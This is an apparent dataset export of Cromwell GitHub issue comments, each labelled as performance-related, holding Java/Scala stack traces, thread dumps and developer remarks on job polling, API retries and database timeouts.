scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell.jar:0.19]; 905212- at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [cromwell.jar:0.19]; 905213- at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [cromwell.jar:0.19]; 905214- at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell.jar:0.19]. ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-214521102:7037,concurren,concurrent,7037,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-214521102,6,['concurren'],['concurrent']
Performance,"un(ForkJoinWorkerThread.java:107). ""db-1"" #37 daemon prio=5 os_prio=0 tid=0x00007fdaf833e800 nid=0xa0d waiting on condition [0x00007fdb80ad0000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b76aed8> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""Hikari Housekeeping Timer (pool db)"" #35 daemon prio=5 os_prio=0 tid=0x00007fdaf8212800 nid=0xa0b waiting on condition [0x00007fdb80cd2000]; java.lang.Thread.State: TIMED_WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b74b1f0> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:215); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.awaitNanos(AbstractQueuedSynchronizer.java:2078); at java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:1093); at java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:809); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExe",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914:4607,concurren,concurrent,4607,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914,1,['concurren'],['concurrent']
Performance,understanding that we are going to proceed w/ cached API calls approach. Just noting that we are not billed for the failed request.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3799#issuecomment-401347618:46,cache,cached,46,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3799#issuecomment-401347618,1,['cache'],['cached']
Performance,"unlikely I or others on the team will have time to look at this issue of disappearing SGE jobs in depth for at least a couple weeks. For now, here's a brain dump of notes. After a short bit of review, I'd perhaps try a different approach.; - On execute or recover, `scheduleOnce` a message back to `self` to later check if a job is alive.; - When the message is received check if the job is alive.; - If the job is alive `scheduleOnce` a message to check if the job is alive again.; - If the job is not alive write an rc file with `143` (or other code, see notes on configuration below).; - An instance of `cromwell.core.retry.Backoff` should travel inside the scheduled messages. Each time the message is to be scheduled, get the next time. As for the existing code, here are a few notes.; - Use `java.time` instead of `java.util`. `java.time.Instant` and `java.time.Duration` may be used to calculate the amount of time between two instants.; - `IsAliveCash.cash` should be `.cache`.; - `.map(_.cache).getOrElse(true)` should be `.forall(_.cache)`, however...; - `.cache` always appears to be `true`, and thus not needed.; - `!isAliveCache.contains` followed by `isAliveCache.get` should be `isAliveCache.getOrElseUpdate(job, IsAliveCache(Instant.now))`.; - There should be only one `SharedFileSystemJob` per `SharedFileSystemAsyncJobExecutionActor`. The reason the values are passed around is because the actor is also partially stateless, using `context.become` to track the `SharedFileSystemJob`. This PR adds state more to the actor, outside of the context, but that shouldn't be needed if the `isAlive` check is switched to running due to multiple `scheduleOnce` calls. The tests are likely timing out because the of the extra checks to `isAlive`. The tests are meant to run as quickly as possible. In general, the order of the job completion checking should always be 1) multiple rc file polls, 2) 30 seconds later `isAlive` checks as necessary. This individual polling per job may overwhelm t",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1346#issuecomment-243562238:1259,cache,cache,1259,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1346#issuecomment-243562238,2,['cache'],['cache']
Performance,"untime.reflect.JoinPointImpl.proceed(JoinPointImpl.java:149) ~[cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation$$anonfun$aroundExecution$1.apply(FutureInstrumentation.scala:44) ~[cromwell.jar:0.19]; at kamon.trace.Tracer$.withContext(TracerModule.scala:53) ~[cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation.aroundExecution(FutureInstrumentation.scala:43) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:31) ~[cromwell.jar:0.19]; at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55) ~[cromwell.jar:0.19]; at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91) ~[cromwell.jar:0.19]; at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91) ~[cromwell.jar:0.19]; at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91) ~[cromwell.jar:0.19]; at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72) ~[cromwell.jar:0.19]; at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90) ~[cromwell.jar:0.19]; at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40) ~[cromwell.jar:0.19]; at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell.jar:0.19]; ```. AND 8 instances of these:. ```; 2016-05-03 17:58:04,687 cromwell-system-akka.actor.default-dispatcher-18 INFO - JES Run [UUID(d3ba97c6):ValidateReadGroupSamFile:13]: Status change from Running to Success; ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991:5684,concurren,concurrent,5684,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991,1,['concurren'],['concurrent']
Performance,"urn code was (none). Full command was: ""/bin/bash"" ""-c"" ""cat cromwell-executions/w/2a89a995-aa89-4172-a5e1-1054cbccd9e0/call-hello/script | /bin/bash <&0"". Contents of cromwell-executions/w/2a89a995-aa89-4172-a5e1-1054cbccd9e0/call-hello/stderr were empty. at cromwell.engine.backend.local.LocalBackend.cromwell$engine$backend$local$LocalBackend$$runSubprocess(LocalBackend.scala:246); at cromwell.engine.backend.local.LocalBackend$$anonfun$execute$1.apply(LocalBackend.scala:144); at cromwell.engine.backend.local.LocalBackend$$anonfun$execute$1.apply(LocalBackend.scala:138); at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24); at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:24); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.nio.file.NoSuchFileException: /home/pgrosu/me/cromwell/cromwell/cromwell-executions/w/2a89a995-aa89-4172-a5e1-1054cbccd9e0/call-hello/rc; at sun.nio.fs.UnixException.translateToIOException(UnixException.java:86); at sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:102); at sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:107); at sun.nio.fs.UnixFileSystemProvider.newByteChannel(UnixFileSystemProvider.java:214); at java.nio.file.Files.newByteChannel(Files.java:361); at java.nio.file.Files.newByteChannel(Files.java:407); at java.nio.file.Files.readAllBytes(Files.java:3149); at better.files.File.loadBytes(File.scala:80); at better.files.File.byteArray(File.scala:81); at better.files.File.contentAsString(File.scal",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/404#issuecomment-177622887:4951,concurren,concurrent,4951,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/404#issuecomment-177622887,1,['concurren'],['concurrent']
Performance,ute(AbstractGoogleClientRequest.java:469) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.Run.status(Run.scala:143) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.Run.checkStatus(Run.scala:156) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$poll$1$$anonfun$42.apply(JesBackend.scala:933) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$poll$1$$anonfun$42.apply(JesBackend.scala:933) ~[cromwell.jar:0.19]; at scala.util.Try$.apply(Try.scala:192) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$poll$1.apply(JesBackend.scala:933) [cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$poll$1.apply(JesBackend.scala:927) [cromwell.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24) [cromwell.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:24) [cromwell.jar:0.19]; at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40) [cromwell.jar:0.19]; at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell.jar:0.19]; ```. We suspect that of all the retries from the errors above plus the new succeeded tasks that now needed post processing created a backlog that may have cause Cromwell to become sluggish and eventually run out of memory. It may have also been the opposite direction where Cromwell becoming sluggish caused these errors to start popping up. @dshiga any additions to explain what we saw when you launched the 20k callset with 3000 intervals?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201:10797,concurren,concurrent,10797,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201,4,['concurren'],['concurrent']
Performance,"uteTask(LightArrayRevolverScheduler.scala:334); at akka.actor.LightArrayRevolverScheduler$$anon$3.executeBucket$1(LightArrayRevolverScheduler.scala:285); at akka.actor.LightArrayRevolverScheduler$$anon$3.nextTick(LightArrayRevolverScheduler.scala:289); at akka.actor.LightArrayRevolverScheduler$$anon$3.run(LightArrayRevolverScheduler.scala:241); at java.base/java.lang.Thread.run(Thread.java:834); ```. Error that I receive now when I try to start Cromwell:. ```; 2020-05-05 15:31:33,773 INFO - dataFileCache commit start; 2020-05-05 15:33:32,400 ERROR - Failed to instantiate Cromwell System. Shutting down Cromwell.; java.sql.SQLTransientConnectionException: db - Connection is not available, request timed out after 121641ms.; at com.zaxxer.hikari.pool.HikariPool.createTimeoutException(HikariPool.java:676); at com.zaxxer.hikari.pool.HikariPool.getConnection(HikariPool.java:190); at com.zaxxer.hikari.pool.HikariPool.getConnection(HikariPool.java:155); at com.zaxxer.hikari.HikariDataSource.getConnection(HikariDataSource.java:100); at slick.jdbc.hikaricp.HikariCPJdbcDataSource.createConnection(HikariCPJdbcDataSource.scala:14); at slick.jdbc.JdbcBackend$BaseSession.<init>(JdbcBackend.scala:494); at slick.jdbc.JdbcBackend$DatabaseDef.createSession(JdbcBackend.scala:46); at slick.jdbc.JdbcBackend$DatabaseDef.createSession(JdbcBackend.scala:37); at slick.basic.BasicBackend$DatabaseDef.acquireSession(BasicBackend.scala:250); at slick.basic.BasicBackend$DatabaseDef.acquireSession$(BasicBackend.scala:249); at slick.jdbc.JdbcBackend$DatabaseDef.acquireSession(JdbcBackend.scala:37); at slick.basic.BasicBackend$DatabaseDef$$anon$3.run(BasicBackend.scala:275); at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128); at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628); at java.base/java.lang.Thread.run(Thread.java:834); ```. Does anyone have any advice for repairing the db, or working out more what's happened?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5271#issuecomment-623865649:2865,concurren,concurrent,2865,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5271#issuecomment-623865649,2,['concurren'],['concurrent']
Performance,"va.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745); ....snip.... ""ForkJoinPool-2-worker-29"" #38 daemon prio=5 os_prio=0 tid=0x00007fdaf4001000 nid=0xa0e waiting on condition [0x00007fdb8073c000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b540500> (a scala.concurrent.forkjoin.ForkJoinPool); at scala.concurrent.forkjoin.ForkJoinPool.scan(ForkJoinPool.java:2075); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). ""db-1"" #37 daemon prio=5 os_prio=0 tid=0x00007fdaf833e800 nid=0xa0d waiting on condition [0x00007fdb80ad0000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b76aed8> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""Hikari Housekeeping Timer (pool db)"" #35 daemon prio=5 os_prio=0 tid=0x00007fdaf8212800 nid=0xa0b waiting on condition [0x00007fdb80cd2000]; java.lang.Thread.State: TIMED_WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914:3972,concurren,concurrent,3972,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914,1,['concurren'],['concurrent']
Performance,"va:617); at java.lang.Thread.run(Thread.java:745); ....snip.... ""ForkJoinPool-2-worker-29"" #38 daemon prio=5 os_prio=0 tid=0x00007fdaf4001000 nid=0xa0e waiting on condition [0x00007fdb8073c000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b540500> (a scala.concurrent.forkjoin.ForkJoinPool); at scala.concurrent.forkjoin.ForkJoinPool.scan(ForkJoinPool.java:2075); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). ""db-1"" #37 daemon prio=5 os_prio=0 tid=0x00007fdaf833e800 nid=0xa0d waiting on condition [0x00007fdb80ad0000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b76aed8> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""Hikari Housekeeping Timer (pool db)"" #35 daemon prio=5 os_prio=0 tid=0x00007fdaf8212800 nid=0xa0b waiting on condition [0x00007fdb80cd2000]; java.lang.Thread.State: TIMED_WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b74b1f0> (a java.util.concurrent.locks.AbstractQueuedSynchroniz",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914:4042,concurren,concurrent,4042,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914,1,['concurren'],['concurrent']
Performance,wExecutionActorData.scala:92); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.handleExecutionSuccess(WorkflowExecutionActor.scala:323); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.cromwell$engine$workflow$lifecycle$execution$WorkflowExecutionActor$$handleCallSuccessful(WorkflowExecutionActor.scala:308); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor$$anonfun$3.applyOrElse(WorkflowExecutionActor.scala:96); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor$$anonfun$3.applyOrElse(WorkflowExecutionActor.scala:81); 	at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:36); 	at akka.actor.FSM$class.processEvent(FSM.scala:663); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.akka$actor$LoggingFSM$$super$processEvent(WorkflowExecutionActor.scala:32); 	at akka.actor.LoggingFSM$class.processEvent(FSM.scala:799); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.processEvent(WorkflowExecutionActor.scala:32); 	at akka.actor.FSM$class.akka$actor$FSM$$processMsg(FSM.scala:657); 	at akka.actor.FSM$$anonfun$receive$1.applyOrElse(FSM.scala:651); 	at akka.actor.Actor$class.aroundReceive(Actor.scala:496); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.aroundReceive(WorkflowExecutionActor.scala:32); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); 	at akka.actor.ActorCell.invoke(ActorCell.scala:495); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:234); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-277496027:3981,concurren,concurrent,3981,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-277496027,12,['concurren'],['concurrent']
Performance,"wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-18"" #93 prio=5 os_prio=0 tid=0x00007fdaa80bc800 nid=0xa54 waiting on condition [0x00007fda90777000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745); ....snip.... ""ForkJoinPool-2-worker-29"" #38 daemon prio=5 os_prio=0 tid=0x00007fdaf4001000 nid=0xa0e waiting on condition [0x00007fdb8073c000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b540500> (a scala.concurrent.forkjoin.ForkJoinPool); at scala.concurrent.forkjoin.ForkJoinPool.scan(ForkJoinPool.java:2075); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:197",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914:2551,concurren,concurrent,2551,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914,1,['concurren'],['concurrent']
Performance,"wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-19"" #94 prio=5 os_prio=0 tid=0x00007fdaa80be800 nid=0xa55 waiting on condition [0x00007fda90676000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-18"" #93 prio=5 os_prio=0 tid=0x00007fdaa80bc800 nid=0xa54 waiting on condition [0x00007fda90777000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914:1674,concurren,concurrent,1674,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914,1,['concurren'],['concurrent']
Performance,"we had emailed Dion about this a few weeks back, he said, . > ""Yep, we do run more tasks in prod, but even with those tasks we can not guarantee 100% of RPCs succeeding. Internally we do retry any backend dependencies silently (may manifest in slightly higher response times), but it's not unexpected to have a few sneak through. For these situations it's advisable to have a backoff / retry for 5xx level errors that are clearly a problem on our end.; > I've checked back on the time range on those two operations, there doesn't seem to be any wide spread issues during that time on our end. We do have monitoring on the unexpected error rates, would you say your error rates are higher than 0.1 or 0.01% ?  (per RPC call vs per operation, as I think you poll each operation a significant number of times?)."". In conversation, Miguel said:. > ""We have a retry on this call, but it does not back off very aggressively. I'll make a note of it with the Cromwell devs."". Almost all of these failures happened on 5/25. It seems like JES is mostly available, but when unavailable this error causes almost everything running to fail.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/903#issuecomment-222799850:260,response time,response times,260,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/903#issuecomment-222799850,2,['response time'],['response times']
Performance,well.engine.workflow.lifecycle.execution.CallPreparationActor$$anonfun$resolveAndEvaluateInputs$1.applyOrElse(JobPreparationActor.scala:48); 	at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:36); 	at scala.util.Failure.recoverWith(Try.scala:203); 	at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor.resolveAndEvaluateInputs(JobPreparationActor.scala:48); 	at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor$$anonfun$receive$1.applyOrElse(JobPreparationActor.scala:27); 	at akka.actor.Actor$class.aroundReceive(Actor.scala:484); 	at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor.aroundReceive(JobPreparationActor.scala:18); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); 	at akka.actor.ActorCell.invoke(ActorCell.scala:495); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:234); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); 	Suppressed: wdl4s.exception.ValidationException: Input evaluation for Call dna_mapping_38.libraryMerge failed.:; inputBams:; 	Could not find the shard mapping to this scatter dna_mapping_38.$scatter_1; outputBam:; 	Could not find the shard mapping to this scatter dna_mapping_38.$scatter_1; 		at wdl4s.Call.evaluateTaskInputs(Call.scala:117); 		at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor$$anonfun$resolveAndEvaluateInputs$2.apply(JobPreparationActor.scala:42); 		at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor$$anonfun$resolveAndEvaluateInputs$2.apply(JobPreparationActor.scala:35); 		at scala.util.Try$.apply(Try.scala:192); 		at 